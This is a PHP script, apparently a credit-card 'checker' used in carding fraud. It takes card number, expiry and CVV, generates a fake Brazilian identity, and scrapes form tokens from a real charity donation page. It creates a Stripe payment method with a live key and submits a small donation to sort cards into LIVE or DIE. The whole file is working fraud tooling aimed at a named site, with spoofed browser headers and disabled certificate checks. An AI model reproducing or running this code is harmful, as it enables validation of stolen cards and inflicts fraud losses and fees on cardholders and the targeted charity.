<?php
header('Content-Type: text/plain');

error_reporting(0);
session_start(); session_write_close();
$start = microtime(true);

$lista = @$_POST['lista'] ?: @$_GET['lista'];
if (!$lista) exit;

$dados = explode('|', $lista);
if (count($dados) < 4) {
    echo 'ERRO: Formato inválido. Use numero|mes|ano|cvv';
    exit;
}

list($cc, $mes, $ano, $cvv) = $dados;
if (strlen($ano) == 2) $ano = "20" . $ano;

function generateRandomData() {
    $firstNames = ['Marcos', 'Andre', 'Felipe', 'Ricardo', 'Bruno', 'Thiago', 'Lucas', 'Gabriel', 'Rafael', 'Diego', 'Juliana', 'Camila', 'Beatriz', 'Leticia', 'Fernanda', 'Amanda', 'Renata', 'Larissa', 'Patricia', 'Mariana'];
    $lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho', 'Almeida', 'Lopes', 'Soares', 'Fernandes', 'Vieira', 'Barbosa'];
    $cities = ['Sao Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Curitiba', 'Porto Alegre', 'Salvador', 'Fortaleza', 'Recife', 'Brasilia', 'Campinas'];
    $streets = ['Rua Treze de Maio', 'Avenida Paulista', 'Rua Augusta', 'Rua das Flores', 'Avenida Brasil', 'Rua Sete de Setembro', 'Rua Amazonas', 'Avenida Getulio Vargas'];
    
    $fName = $firstNames[array_rand($firstNames)];
    $lName = $lastNames[array_rand($lastNames)];
    $email = strtolower($fName . $lName . rand(100, 999) . '@gmail.com');
    
    return [
        'first_name' => $fName,
        'last_name' => $lName,
        'email' => $email,
        'city' => $cities[array_rand($cities)],
        'address' => $streets[array_rand($streets)] . ', ' . rand(1, 2000),
        'postcode' => rand(10000, 99999) . '-' . rand(100, 999),
        'phone' => '119' . rand(7000, 9999) . rand(1000, 9999)
    ];
}

$randomUser = generateRandomData();

$publicKey = "pk_live_51I8YQMChDXVFdNz08f5bXJkM1uNqbRQf4appGKwoyQuqSWCMvxNLSNwp8VtM5EDWrIxICIsdtbHRI165D4ixonnD002VDgegEk";
$siteUrl = "https://gaylifemagazine.co.uk";
$userAgent = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36";

function request($url, $method = 'GET', $headers = [], $postData = null, $cookies = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($postData) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($postData) ? http_build_query($postData) : $postData);
        }
    }
    
    if ($headers) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if ($cookies) curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headerStr = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $headerStr, $matches);
    $newCookies = implode('; ', $matches[1]);
    
    curl_close($ch);
    return ['body' => $body, 'cookies' => $newCookies];
}

$donationPage = request("$siteUrl/campaigns/george-house-trust/donate/", "GET", ["User-Agent: $userAgent"]);
$html = $donationPage['body'];
$cookies = $donationPage['cookies'];

preg_match('/name="_charitable_donation_nonce" value="([^"]+)"/', $html, $nonceMatch);
$nonce = $nonceMatch[1] ?? "";

preg_match('/name="charitable_form_id" value="([^"]+)"/', $html, $formIdMatch);
$formId = $formIdMatch[1] ?? "";

preg_match('/name="campaign_id" value="([^"]+)"/', $html, $campaignIdMatch);
$campaignId = $campaignIdMatch[1] ?? "";

if (empty($nonce) || empty($formId)) {
    echo 'ERRO: Nao foi possivel capturar os tokens do site.';
    exit;
}

$stripeData = [
    'type' => 'card',
    'billing_details[name]' => $randomUser['first_name'] . ' ' . $randomUser['last_name'],
    'billing_details[email]' => $randomUser['email'],
    'billing_details[address][city]' => $randomUser['city'],
    'billing_details[address][country]' => 'BR',
    'billing_details[address][line1]' => $randomUser['address'],
    'billing_details[address][postal_code]' => $randomUser['postcode'],
    'billing_details[phone]' => $randomUser['phone'],
    'card[number]' => $cc,
    'card[cvc]' => $cvv,
    'card[exp_month]' => $mes,
    'card[exp_year]' => $ano,
    'key' => $publicKey,
    'payment_user_agent' => 'stripe.js/f386584e69; stripe-js-v3/f386584e69; card-element'
];

$stripeRes = request("https://api.stripe.com/v1/payment_methods", "POST", ["Origin: https://js.stripe.com", "Referer: https://js.stripe.com/", "User-Agent: $userAgent"], $stripeData);
$stripeJson = json_decode($stripeRes['body'], true);

if (!isset($stripeJson['id'])) {
    $errorMsg = $stripeJson['error']['message'] ?? 'Desconhecido';
    $tempo = number_format(microtime(true) - $start, 2);
    if (stripos($errorMsg, 'cvc') !== false || stripos($errorMsg, 'cvv') !== false) {
        echo "DECLINED: " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " - Invalid CVC | " . $tempo . "s";
    } else {
        echo "DECLINED: " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " - " . $errorMsg . " | " . $tempo . "s";
    }
    exit;
}

$checkoutData = [
    'charitable_form_id' => $formId,
    $formId => '',
    '_charitable_donation_nonce' => $nonce,
    '_wp_http_referer' => '/campaigns/george-house-trust/donate/',
    'campaign_id' => $campaignId,
    'description' => 'George House Trust',
    'ID' => '71099',
    'custom_donation_amount' => '1',
    'first_name' => $randomUser['first_name'],
    'last_name' => $randomUser['last_name'],
    'email' => $randomUser['email'],
    'address' => $randomUser['address'],
    'city' => $randomUser['city'],
    'postcode' => $randomUser['postcode'],
    'country' => 'BR',
    'phone' => $randomUser['phone'],
    'gateway' => 'stripe',
    'stripe_payment_method' => $stripeJson['id'],
    'action' => 'make_donation',
    'form_action' => 'make_donation'
];

$finalRes = request("$siteUrl/wp-admin/admin-ajax.php", "POST", [
    "Accept: application/json, text/javascript, */*; q=0.01",
    "X-Requested-With: XMLHttpRequest",
    "User-Agent: $userAgent"
], $checkoutData, $cookies);

$responseBody = json_decode($finalRes['body'], true);
$tempo = number_format(microtime(true) - $start, 2);
$valor = "1.00 USD$";

if (isset($responseBody['success']) && $responseBody['success'] === true) {
    echo "LIVE | " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " | APROVADA | " . $valor . " | " . $tempo . "s";
} elseif (isset($responseBody['errors']) && is_array($responseBody['errors'])) {
    $errorMsg = implode(' ', $responseBody['errors']);
    if (stripos($errorMsg, 'cvc') !== false || stripos($errorMsg, 'cvv') !== false || stripos($errorMsg, 'security code is incorrect') !== false) {
	        echo "LIVE | " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " | CVV INVÁLIDO | " . $valor . " | " . $tempo . "s";
	    } elseif (stripos($errorMsg, 'declined') !== false) {
        echo "DIE | " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " | RECUSADA | " . $valor . " | " . $tempo . "s";
    } else {
        echo "DIE | " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " | " . $errorMsg . " | " . $valor . " | " . $tempo . "s";
    }
} elseif (isset($responseBody['requires_action']) && $responseBody['requires_action'] === true) {
    echo "LIVE | " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " | APROVADA | " . $valor . " | " . $tempo . "s";
} else {
    echo "DIE | " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " | ERRO PROCESSAMENTO | " . $valor . " | " . $tempo . "s";
}
?>
